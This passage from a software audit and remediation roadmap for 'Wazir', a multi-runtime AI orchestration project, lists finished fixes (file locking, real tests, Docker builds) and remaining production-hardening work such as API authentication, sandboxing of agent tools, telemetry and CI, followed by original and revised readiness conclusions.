- [x] **Process-Safe Storage**: `JsonFileStore` (`packages/shared/src/store.ts`) now uses a dependency-free cross-process file lock with stale-lock recovery, in place of `proper-lockfile`. Proven with real separate OS processes, not just mocks — see §5.
- [x] **Real End-to-End Test Suite**: Placeholder tests replaced with a real fake-`RuntimeAdapter`-backed suite verifying token streaming, tool call execution (including a real policy denial), and the deterministic verification loop — see §6.
- [x] **Docker & Compose Assets**: `Dockerfile` (4 targets) + `docker-compose.yml`, actually built and run (all 4 targets, the full compose stack, cross-container worker↔API registration) — see §7.2.

### Phase 4: Production Hardening (Enterprise Production)
- [ ] **API Authentication & RBAC**: Add API keys or JWT Bearer tokens to `apps/api` and restrict CORS headers.
- [ ] **Container Sandboxing**: Execute agent tools inside ephemeral Docker containers or Linux namespaces rather than directly on the host machine.
- [ ] **OpenTelemetry Integration**: Export structured traces and Prometheus metrics for task latency, token counts, and scheduling decisions.
- [ ] **Automated CI/CD**: Implement GitHub Actions / GitLab CI workflows to enforce `npm run build`, `npm run typecheck`, and `npm test` on every pull request.

---

## 9. Conclusion

**Original conclusion (superseded)**: Wazir possesses a well-thought-out, modern architectural
design for multi-runtime, hardware-aware AI orchestration. Its core scheduling mathematics and
runtime adapters for Ollama and LM Studio are functional. However, the product is currently in
an **early alpha / prototype state**:
1. The execution path from CLI to agent was stubbed out.
2. The distributed worker daemon cannot ingest tasks.
3. The policy engine contains critical command execution bypasses.
4. Over a third of test suites are tautological smoke checks.

Production deployment should be held until **Phase 1 and Phase 2 remediation items are complete**.

### Revised conclusion

All four of the above are now fixed, and Phase 3 (Postgres wiring, cross-process file locking,
real tests, Docker/Compose/systemd/launchd) is closed too — see the inline annotations
throughout this document and `WAZIR_REMEDIATION_PROGRESS.md` for exactly what changed, what
was found along the way (several real bugs surfaced specifically *by* writing real tests and
*by* actually running the Docker images instead of just reading the Dockerfile), and what's
still explicitly out of scope.

What's left is Phase 4 in its entirety — API authentication and CORS restriction, sandboxing
agent tool execution away from the host, OpenTelemetry/metrics, and CI enforcing build/
typecheck/test on every change — plus two documented-but-unfixed dead fields
(`ModelRecord.runtimeCompatibility`, `ComputerRegistry` degraded-health reporting) that need a
design decision rather than a mechanical fix, and the macOS DMG path, which remains unverified
simply because no macOS runner was available to actually build and open one.

Wazir is no longer blocked for a single trusted operator running it on hardware they control.
It is still blocked for multi-tenant or public-internet deployment until Phase 4 closes.
